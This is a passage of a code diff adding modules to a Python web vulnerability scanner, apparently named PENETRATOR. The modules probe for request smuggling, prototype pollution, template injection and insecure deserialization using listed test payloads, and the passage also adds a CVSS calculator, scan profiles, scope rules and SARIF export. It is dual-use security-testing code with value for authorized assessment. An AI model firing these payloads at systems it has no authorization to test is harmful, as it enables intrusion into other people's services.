+        "Java": "JSESSIONID",
+        "Laravel": "laravel_session",
+        "Django": "csrftoken",
+        "Flask": "session",
+        "Express": "connect.sid",
+        "Cloudflare": "__cf_bm",
+    },
+}
+
+
+def tech_fingerprint(url: str, log: Logger) -> dict:
+    """Fingerprint web technologies (Wappalyzer-style)."""
+    import requests
+    log(f"[*] Technology fingerprinting: {url}", "cyan")
+    result: dict = {"url": url, "technologies": [], "details": {}}
+
+    try:
+        resp = requests.get(url, timeout=15, verify=False,
+                            headers={"User-Agent": random_ua()},
+                            allow_redirects=True)
+    except requests.RequestException as exc:
+        log(f"[-] {exc}", "err")
+        return result
+
+    found: set[str] = set()
+
+    # Check headers
+    for header_name, techs in TECH_SIGNATURES["headers"].items():
+        header_val = resp.headers.get(header_name, "")
+        if header_val:
+            for tech, pattern in techs.items():
+                if re.search(pattern, header_val, re.IGNORECASE):
+                    found.add(tech)
+                    result["details"][tech] = f"Header {header_name}: {header_val[:60]}"
+
+    # Check HTML body
+    body = resp.text[:200000]  # Cap to avoid OOM
+    for tech, pattern in TECH_SIGNATURES["html"].items():
+        if re.search(pattern, body, re.IGNORECASE):
+            found.add(tech)
+            if tech not in result["details"]:
+                result["details"][tech] = "HTML pattern match"
+
+    # Check cookies
+    cookie_names = {c.name.lower() for c in resp.cookies}
+    raw_cookies = resp.headers.get("Set-Cookie", "").lower()
+    for tech, cookie in TECH_SIGNATURES["cookies"].items():
+        if cookie.lower() in cookie_names or cookie.lower() in raw_cookies:
+            found.add(tech)
+            if tech not in result["details"]:
+                result["details"][tech] = f"Cookie: {cookie}"
+
+    result["technologies"] = sorted(found)
+    for tech in sorted(found):
+        log(f"  [+] {tech} — {result['details'].get(tech, '')}", "ok")
+
+    if not found:
+        log("[-] No technologies fingerprinted", "muted")
+    else:
+        log(f"[*] {len(found)} technology(ies) identified", "cyan")
+    session_set("last_tech_fp", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 41. DNS Rebinding Check
+# ---------------------------------------------------------------------------
+_RFC1918 = [
+    ("10.0.0.0", "10.255.255.255"),
+    ("172.16.0.0", "172.31.255.255"),
+    ("192.168.0.0", "192.168.255.255"),
+    ("127.0.0.0", "127.255.255.255"),
+    ("169.254.0.0", "169.254.255.255"),
+]
+
+
+def _is_private_ip(ip_str: str) -> bool:
+    """Check if an IP is in RFC1918 / loopback / link-local ranges."""
+    try:
+        parts = [int(p) for p in ip_str.split(".")]
+        ip_int = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
+        for start, end in _RFC1918:
+            sp = [int(p) for p in start.split(".")]
+            ep = [int(p) for p in end.split(".")]
+            s = (sp[0] << 24) + (sp[1] << 16) + (sp[2] << 8) + sp[3]
+            e = (ep[0] << 24) + (ep[1] << 16) + (ep[2] << 8) + ep[3]
+            if s <= ip_int <= e:
+                return True
+    except (ValueError, IndexError):
+        pass
+    return False
+
+
+def dns_rebinding_check(domain: str, log: Logger) -> dict:
+    """Check if a domain resolves to internal/private IPs (DNS rebinding risk)."""
+    import socket as _socket
+    log(f"[*] DNS rebinding check: {domain}", "cyan")
+    result: dict = {"domain": domain, "resolutions": [], "private_ips": [],
+                    "vulnerable": False}
+
+    # Resolve multiple times (rebinding flips between public and private)
+    for attempt in range(10):
+        if _should_stop():
+            break
+        try:
+            ip = _socket.gethostbyname(domain)
+            result["resolutions"].append(ip)
+            is_priv = _is_private_ip(ip)
+            if is_priv:
+                result["private_ips"].append(ip)
+                result["vulnerable"] = True
+                log(f"  [{attempt + 1}] {ip} — PRIVATE!", "err")
+            else:
+                log(f"  [{attempt + 1}] {ip}", "ok")
+        except _socket.gaierror:
+            log(f"  [{attempt + 1}] resolution failed", "muted")
+        time.sleep(0.3)
+
+    unique = set(result["resolutions"])
+    if len(unique) > 1:
+        log(f"[!] Domain resolves to multiple IPs: {unique}", "warn")
+    if result["vulnerable"]:
+        log("[!] DNS REBINDING RISK — domain resolves to private IP", "err")
+    else:
+        log("[+] No private IP resolutions detected", "ok")
+    session_set("last_dns_rebinding", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 42. HTTP/2 Smuggling Detector
+# ---------------------------------------------------------------------------
+def http2_smuggling(url: str, log: Logger) -> dict:
+    """Test for HTTP/2 request smuggling (H2.CL / H2.TE desync).
+
+    Note: Uses HTTP/1.1 (requests library). This tests for CL/TE
+    desync indicators that are also relevant to HTTP/1.1 servers
+    fronted by HTTP/2 reverse proxies.
+    """
+    import requests
+    from urllib.parse import urlparse
+    log(f"[*] HTTP/2 smuggling test: {url}", "cyan")
+    log("  Note: testing CL/TE desync patterns (HTTP/1.1 probe)", "muted")
+    result: dict = {"url": url, "tests": [], "issues": []}
+    parsed = urlparse(url)
+    host = parsed.hostname or ""
+
+    # Test 1: H2.CL — Content-Length mismatch
+    test_payloads = [
+        {
+            "name": "H2.CL Content-Length mismatch",
+            "headers": {"Content-Length": "0", "Transfer-Encoding": "chunked"},
+            "body": "0\r\n\r\nSMUGGLED",
+        },
+        {
+            "name": "H2.TE Transfer-Encoding obfuscation",
+            "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": "cow"},
+            "body": "5\r\nsmug\r\n0\r\n\r\n",
+        },
+        {
+            "name": "CL.TE with newline",
+            "headers": {"Content-Length": "6", "Transfer-Encoding": " chunked"},
+            "body": "0\r\n\r\nX",
+        },
+    ]
+
+    for payload in test_payloads:
+        if _should_stop():
+            break
+        try:
+            resp = requests.post(url, timeout=10, verify=False,
+                                 headers={**payload["headers"],
+                                          "Host": host,
+                                          "User-Agent": random_ua()},
+                                 data=payload["body"])
+            # Check for desync indicators
+            is_suspicious = resp.status_code in (400, 500, 502, 503)
+            test_r = {
+                "name": payload["name"],
+                "status": resp.status_code,
+                "suspicious": is_suspicious,
+                "size": len(resp.text),
+            }
+            result["tests"].append(test_r)
+            if is_suspicious:
+                result["issues"].append(payload["name"])
+                log(f"  [!] {payload['name']}: status {resp.status_code} — SUSPICIOUS", "warn")
+            else:
+                log(f"  [+] {payload['name']}: status {resp.status_code}", "ok")
+        except requests.RequestException as exc:
+            result["tests"].append({"name": payload["name"], "error": str(exc)})
+            log(f"  [-] {payload['name']}: {exc}", "muted")
+
+    if result["issues"]:
+        log(f"[!] {len(result['issues'])} potential smuggling indicator(s)", "err")
+    else:
+        log("[+] No HTTP/2 smuggling indicators detected", "ok")
+    session_set("last_h2_smuggling", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 43. Prototype Pollution Scanner
+# ---------------------------------------------------------------------------
+PROTO_POLLUTION_PAYLOADS = [
+    "__proto__[test]=polluted",
+    "__proto__.test=polluted",
+    "constructor[prototype][test]=polluted",
+    "constructor.prototype.test=polluted",
+]
+
+
+def prototype_pollution_scan(url: str, log: Logger) -> dict:
+    """Test for client-side and server-side prototype pollution."""
+    import requests
+    log(f"[*] Prototype pollution scan: {url}", "cyan")
+    result: dict = {"url": url, "tests": [], "issues": []}
+
+    for payload in PROTO_POLLUTION_PAYLOADS:
+        if _should_stop():
+            break
+        # Test via query parameter
+        sep = "&" if "?" in url else "?"
+        test_url = f"{url}{sep}{payload}"
+        try:
+            resp = requests.get(test_url, timeout=10, verify=False,
+                                headers={"User-Agent": random_ua()})
+            reflected = "polluted" in resp.text
+            test_r = {"payload": payload, "method": "GET",
+                      "reflected": reflected, "status": resp.status_code}
+            result["tests"].append(test_r)
+            if reflected:
+                result["issues"].append(f"GET: {payload}")
+                log(f"  [!] GET {payload}: REFLECTED in response!", "err")
+            else:
+                log(f"  [+] GET {payload}: not reflected", "ok")
+        except requests.RequestException:
+            pass
+
+        # Test via JSON body — vary the body per payload
+        try:
+            # Map query-string payload to equivalent JSON structure
+            if "constructor" in payload:
+                json_body = {"constructor": {"prototype": {"test": "polluted"}}}
+                json_label = "JSON constructor.prototype"
+            else:
+                json_body = {"__proto__": {"test": "polluted"}}
+                json_label = "JSON __proto__"
+            resp = requests.post(url, json=json_body, timeout=10, verify=False,
+                                 headers={"User-Agent": random_ua()})
+            reflected = "polluted" in resp.text
+            test_r = {"payload": json_label, "method": "POST",
+                      "reflected": reflected, "status": resp.status_code}
+            result["tests"].append(test_r)
+            if reflected:
+                result["issues"].append(f"POST {json_label}")
+                log(f"  [!] POST {json_label}: REFLECTED!", "err")
+        except requests.RequestException:
+            pass
+
+    if result["issues"]:
+        log(f"[!] {len(result['issues'])} prototype pollution vector(s) found!", "err")
+    else:
+        log("[+] No prototype pollution detected", "ok")
+    session_set("last_proto_pollution", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 44. Server-Side Template Injection (SSTI) Scanner
+# ---------------------------------------------------------------------------
+SSTI_PAYLOADS = [
+    # (payload, expected_output, template_engine)
+    ("{{7*7}}", "49", "Jinja2/Twig"),
+    ("${7*7}", "49", "FreeMarker/Mako"),
+    ("#{7*7}", "49", "Ruby ERB / Thymeleaf"),
+    ("<%= 7*7 %>", "49", "ERB/EJS"),
+    ("{{7*'7'}}", "7777777", "Jinja2 (string multiply)"),
+    ("${T(java.lang.Runtime)}", "java.lang.Runtime", "Spring SpEL"),
+    ("{{config}}", "Config", "Flask/Jinja2 debug"),
+    ("{{self}}", "TemplateReference", "Jinja2 self"),
+    ("@(1+1)", "2", "Razor"),
+    ("#set($x=7*7)${x}", "49", "Velocity"),
+]
+
+
+def ssti_scan(url: str, param: str, log: Logger) -> dict:
+    """Test a URL parameter for Server-Side Template Injection."""
+    import requests
+    log(f"[*] SSTI scan: {url} (param={param})", "cyan")
+    result: dict = {"url": url, "param": param, "findings": []}
+
+    for payload, expected, engine in SSTI_PAYLOADS:
+        if _should_stop():
+            break
+        # Inject via GET
+        sep = "&" if "?" in url else "?"
+        test_url = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
+        try:
+            resp = requests.get(test_url, timeout=10, verify=False,
+                                headers={"User-Agent": random_ua()})
+            if expected.lower() in resp.text.lower():
+                result["findings"].append({
+                    "payload": payload, "engine": engine,
+                    "expected": expected, "found": True,
+                })
+                log(f"  [!] SSTI detected ({engine}): {payload} → {expected}", "err")
+            else:
+                log(f"  [+] {engine}: not reflected", "ok")
+        except requests.RequestException:
+            pass
+
+    if result["findings"]:
+        log(f"[!] {len(result['findings'])} SSTI vector(s) confirmed!", "err")
+    else:
+        log("[+] No SSTI vulnerabilities detected", "ok")
+    session_set("last_ssti_result", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 45. Insecure Deserialization Tester
+# ---------------------------------------------------------------------------
+DESER_PAYLOADS = [
+    # (name, content_type, body_bytes_hex, detection_pattern)
+    ("Java ObjectInputStream", "application/x-java-serialized-object",
+     "aced0005", "java|ClassNotFoundException|ObjectInputStream"),
+    ("PHP serialize", "application/x-www-form-urlencoded",
+     None, "unserialize|Object of class|__wakeup"),
+    ("Python pickle", "application/octet-stream",
+     "80049505", "pickle|unpickle|module"),
+    (".NET ViewState", "application/x-www-form-urlencoded",
+     None, "ViewState|MAC validation|serialization"),
+    ("Node.js node-serialize", "application/json",
+     None, "ERR_ASSERTION|unexpected token|serialize"),
+]
+
+
+def insecure_deser_test(url: str, log: Logger) -> dict:
+    """Test for insecure deserialization vulnerabilities."""
+    import requests
+    log(f"[*] Insecure deserialization test: {url}", "cyan")
+    result: dict = {"url": url, "tests": [], "issues": []}
+
+    for name, content_type, hex_body, detection in DESER_PAYLOADS:
+        if _should_stop():
+            break
+        body: bytes
+        if hex_body:
+            body = bytes.fromhex(hex_body) + b"\x00" * 50
+        elif "php" in name.lower():
+            body = b'O:8:"stdClass":0:{}'
+        elif "node" in name.lower():
+            body = b'{"rce":"_$$ND_FUNC$$_function(){return 1}()"}'
+        elif "viewstate" in name.lower():
+            body = b'__VIEWSTATE=/wEPDwUKLTEwNjczMjQ5Ng=='
+        else:
+            body = b'\x00' * 20
+
+        try:
+            resp = requests.post(url, data=body, timeout=10, verify=False,
+                                 headers={"Content-Type": content_type,
+                                          "User-Agent": random_ua()})
+            # Check if response reveals deserialization processing
+            detected = bool(re.search(detection, resp.text, re.IGNORECASE))
+            test_r = {
+                "name": name, "status": resp.status_code,
+                "detected": detected, "size": len(resp.text),
+            }
+            result["tests"].append(test_r)
+            if detected:
+                result["issues"].append(name)
+                log(f"  [!] {name}: deserialization signatures in response!", "err")
+            else:
+                log(f"  [+] {name}: no indicators ({resp.status_code})", "ok")
+        except requests.RequestException as exc:
+            log(f"  [-] {name}: {exc}", "muted")
+
+    if result["issues"]:
+        log(f"[!] {len(result['issues'])} deserialization issue(s) detected!", "err")
+    else:
+        log("[+] No deserialization vulnerabilities detected", "ok")
+    session_set("last_deser_test", result)
+    return result
+
+
+# ===================================================================
+#  Architecture Features: CVSS, Profiles, Scope, DB, SARIF
+# ===================================================================
+
+# ---------------------------------------------------------------------------
+# CVSS v3.1 Calculator
+# ---------------------------------------------------------------------------
+_CVSS31_WEIGHTS = {
+    "AV": {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20},
+    "AC": {"L": 0.77, "H": 0.44},
+    "PR": {
+        "U": {"N": 0.85, "L": 0.62, "H": 0.27},
+        "C": {"N": 0.85, "L": 0.68, "H": 0.50},
+    },
+    "UI": {"N": 0.85, "R": 0.62},
+    "S":  {"U": False, "C": True},
+    "C":  {"H": 0.56, "L": 0.22, "N": 0.0},
+    "I":  {"H": 0.56, "L": 0.22, "N": 0.0},
+    "A":  {"H": 0.56, "L": 0.22, "N": 0.0},
+}
+
+
+def cvss_calculate(vector: str, log: Logger) -> dict:
+    """Calculate CVSS v3.1 base score from a vector string.
+
+    Example vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    """
+    import math as _math
+    log(f"[*] CVSS v3.1 calculation: {vector}", "cyan")
+    result: dict = {"vector": vector, "score": 0.0, "severity": "None",
+                    "metrics": {}}
+
+    # Parse vector
+    parts = vector.replace("CVSS:3.1/", "").replace("CVSS:3.0/", "").split("/")
+    metrics: dict[str, str] = {}
+    for part in parts:
+        if ":" in part:
+            k, v = part.split(":", 1)
+            metrics[k] = v
+    result["metrics"] = metrics
+
+    required = ("AV", "AC", "PR", "UI", "S", "C", "I", "A")
+    for m in required:
+        if m not in metrics:
+            log(f"[-] Missing metric: {m}", "err")
+            return result
+
+    try:
+        av = _CVSS31_WEIGHTS["AV"][metrics["AV"]]
+        ac = _CVSS31_WEIGHTS["AC"][metrics["AC"]]
+        scope_changed = _CVSS31_WEIGHTS["S"][metrics["S"]]
+        pr_scope = "C" if scope_changed else "U"
+        pr = _CVSS31_WEIGHTS["PR"][pr_scope][metrics["PR"]]
+        ui = _CVSS31_WEIGHTS["UI"][metrics["UI"]]
+        c = _CVSS31_WEIGHTS["C"][metrics["C"]]
+        i = _CVSS31_WEIGHTS["I"][metrics["I"]]
+        a = _CVSS31_WEIGHTS["A"][metrics["A"]]
+    except KeyError as exc:
+        log(f"[-] Invalid metric value: {exc}", "err")
+        return result
+
+    # ISS (Impact Sub-Score)
+    iss = 1 - ((1 - c) * (1 - i) * (1 - a))
+
+    if iss <= 0:
+        result["score"] = 0.0
+    else:
+        # Exploitability
+        exploitability = 8.22 * av * ac * pr * ui
+
+        if scope_changed:
+            impact = 7.52 * (iss - 0.029) - 3.25 * (iss * 0.9731 - 0.02) ** 13
+        else:
+            impact = 6.42 * iss
+
+        if impact <= 0:
+            result["score"] = 0.0
+        else:
+            if scope_changed:
+                raw = min(1.08 * (impact + exploitability), 10.0)
+            else:
+                raw = min(impact + exploitability, 10.0)
+            # Round up to nearest 0.1
+            result["score"] = _math.ceil(raw * 10) / 10
+
+    score = result["score"]
+    if score == 0:
+        result["severity"] = "None"
+    elif score < 4.0:
+        result["severity"] = "Low"
+    elif score < 7.0:
+        result["severity"] = "Medium"
+    elif score < 9.0:
+        result["severity"] = "High"
+    else:
+        result["severity"] = "Critical"
+
+    log(f"  Score: {score} ({result['severity']})", "ok" if score < 4 else ("warn" if score < 7 else "err"))
+    log(f"  ISS: {iss:.3f}, Exploitability: {8.22 * av * ac * pr * ui:.3f}", "info")
+    return result
+
+
+# ---------------------------------------------------------------------------
+# Scan Profiles
+# ---------------------------------------------------------------------------
+SCAN_PROFILES: dict[str, dict] = {
+    "quick": {
+        "description": "Fast scan: port scan + tech fingerprint + headers",
+        "steps": ["port_scan", "tech_fingerprint", "header_check"],
+    },
+    "standard": {
+        "description": "Standard scan: recon + web attacks + TLS",
+        "steps": ["port_scan", "subdomain_find", "tech_fingerprint",
+                  "cors_test", "header_check", "tls_scan", "cookie_audit"],
+    },
+    "deep": {
+        "description": "Deep scan: full recon + all web tests + OSINT",
+        "steps": ["port_scan", "subdomain_find", "subdomain_perm",
+                  "buster", "tech_fingerprint", "cors_test",
+                  "header_check", "tls_scan", "cookie_audit",
+                  "csrf_analyze", "open_redirect", "waf_detect",
+                  "ssti_scan", "xss_probe", "lfi_scan", "ssrf_scan",
+                  "js_endpoint_extract", "whois_lookup"],
+    },
+}
+
+
+def run_profile(name: str, target: str, log: Logger) -> dict:
+    """Run a predefined scan profile on a target."""
+    profile = SCAN_PROFILES.get(name.lower())
+    if not profile:
+        log(f"[-] Unknown profile '{name}'. Available: {', '.join(SCAN_PROFILES)}", "err")
+        return {"error": f"Unknown profile: {name}"}
+
+    log(f"[*] Running '{name}' profile on {target}", "cyan")
+    log(f"  {profile['description']}", "info")
+    log(f"  Steps: {', '.join(profile['steps'])}", "info")
+
+    session_set("last_target", target)
+    results: dict = {"profile": name, "target": target, "steps": {}}
+
+    # Use attack_chain which already handles step dispatch
+    chain_result = attack_chain(target, profile["steps"], log)
+    results["steps"] = chain_result.get("outputs", {})
+    return results
+
+
+# ---------------------------------------------------------------------------
+# Scope Management (engine wrappers)
+# ---------------------------------------------------------------------------
+def scope_add(target: str, in_scope: bool, log: Logger) -> None:
+    """Add a target pattern to the scope."""
+    try:
+        from gui.db import add_scope as _db_add
+    except ImportError:
+        log("[-] Database module unavailable (sqlite3 missing?)", "err")
+        return
+    _db_add(target, in_scope)
+    tag = "ok" if in_scope else "warn"
+    label = "IN-SCOPE" if in_scope else "OUT-OF-SCOPE"
+    log(f"[+] {target} marked as {label}", tag)
+
+
+def scope_remove(target: str, log: Logger) -> None:
+    """Remove a target pattern from the scope."""
+    try:
+        from gui.db import remove_scope as _db_remove
+    except ImportError:
+        log("[-] Database module unavailable", "err")
+        return
+    _db_remove(target)
+    log(f"[-] {target} removed from scope", "info")
+
+
+def scope_check(target: str, log: Logger) -> bool | None:
+    """Check if a target is in scope."""
+    try:
+        from gui.db import check_scope as _db_check
+    except ImportError:
+        log("[-] Database module unavailable", "err")
+        return None
+    status = _db_check(target)
+    if status is None:
+        log(f"  {target}: no scope rules defined (allowed)", "muted")
+    elif status:
+        log(f"  {target}: IN SCOPE ✓", "ok")
+    else:
+        log(f"  {target}: OUT OF SCOPE ✗", "err")
+    return status
+
+
+def scope_list(log: Logger) -> list[dict]:
+    """List all scope rules."""
+    try:
+        from gui.db import get_scope as _db_scope
+    except ImportError:
+        log("[-] Database module unavailable", "err")
+        return []
+    rules = _db_scope()
+    if not rules:
+        log("  No scope rules defined", "muted")
+    for r in rules:
+        tag = "ok" if r["in_scope"] else "warn"
+        label = "IN" if r["in_scope"] else "OUT"
+        log(f"  [{label}] {r['pattern']}", tag)
+    return rules
+
+
+# ---------------------------------------------------------------------------
+# Database wrappers
+# ---------------------------------------------------------------------------
+def db_init(path: str | None, log: Logger) -> str:
+    """Initialize the SQLite database."""
+    try:
+        from gui.db import init_db
+    except ImportError:
+        log("[-] Database module unavailable (sqlite3 missing?)", "err")
+        return ""
+    db_path = init_db(path)
+    log(f"[+] Database initialized: {db_path}", "ok")
+    return str(db_path)
+
+
+def db_store(tool: str, target: str, severity: str, data: object,
+             log: Logger) -> int:
+    """Store a finding in the database."""
+    try:
+        from gui.db import store_finding
+    except ImportError:
+        log("[-] Database module unavailable", "err")
+        return -1
+    fid = store_finding(tool=tool, target=target, severity=severity, data=data)
+    log(f"  Stored finding #{fid} ({tool} / {severity})", "muted")
+    return fid
+
+
+def db_query(tool: str | None, target: str | None, severity: str | None,
+             log: Logger) -> list[dict]:
+    """Query findings from the database."""
+    try:
+        from gui.db import query_findings
+    except ImportError:
+        log("[-] Database module unavailable", "err")
+        return []
+    rows = query_findings(tool=tool, target=target, severity=severity)
+    log(f"  {len(rows)} finding(s) returned", "info")
+    return rows
+
+
+# ---------------------------------------------------------------------------
+# SARIF Report Export
+# ---------------------------------------------------------------------------
+def sarif_export(findings: list[dict], output_path: str, log: Logger) -> str:
+    """Export findings to SARIF v2.1.0 format (for IDE / GitHub integration)."""
+    import json as _json
+    log(f"[*] SARIF export → {output_path}", "cyan")
+
+    sarif: dict = {
+        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+        "version": "2.1.0",
+        "runs": [{
+            "tool": {
+                "driver": {
+                    "name": "PENETRATOR",
+                    "version": "1.7.0",
+                    "informationUri": "https://github.com/Oli97430/PENETRATOR",
+                    "rules": [],
+                }
+            },
+            "results": [],
+        }],
+    }
+
+    rules_seen: dict[str, int] = {}
+    run = sarif["runs"][0]
+
+    for finding in findings:
+        tool = finding.get("tool", "unknown")
+        severity = finding.get("severity", "note")
+        target = finding.get("target", "")
+        detail = finding.get("detail", finding.get("data", ""))
+
+        # Map severity → SARIF level
+        level_map = {"critical": "error", "high": "error", "medium": "warning",
+                      "low": "note", "info": "note"}
+        level = level_map.get(severity.lower(), "note")
+
+        # Create rule if needed
+        if tool not in rules_seen:
+            rule_idx = len(rules_seen)
+            rules_seen[tool] = rule_idx
+            run["tool"]["driver"]["rules"].append({
+                "id": tool.replace(" ", "_"),
+                "shortDescription": {"text": tool},
+            })
+        else:
+            rule_idx = rules_seen[tool]
+
+        result_obj: dict = {
+            "ruleId": tool.replace(" ", "_"),
+            "ruleIndex": rule_idx,
+            "level": level,
+            "message": {"text": str(detail)[:2000] if detail else tool},
+        }
+        if target:
+            result_obj["locations"] = [{
+                "physicalLocation": {
+                    "artifactLocation": {"uri": target},
+                }
+            }]
+        run["results"].append(result_obj)
+
+    path = Path(output_path)
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(_json.dumps(sarif, indent=2, ensure_ascii=False), encoding="utf-8")
+    log(f"[+] Exported {len(findings)} finding(s) to SARIF", "ok")
+    return str(path)
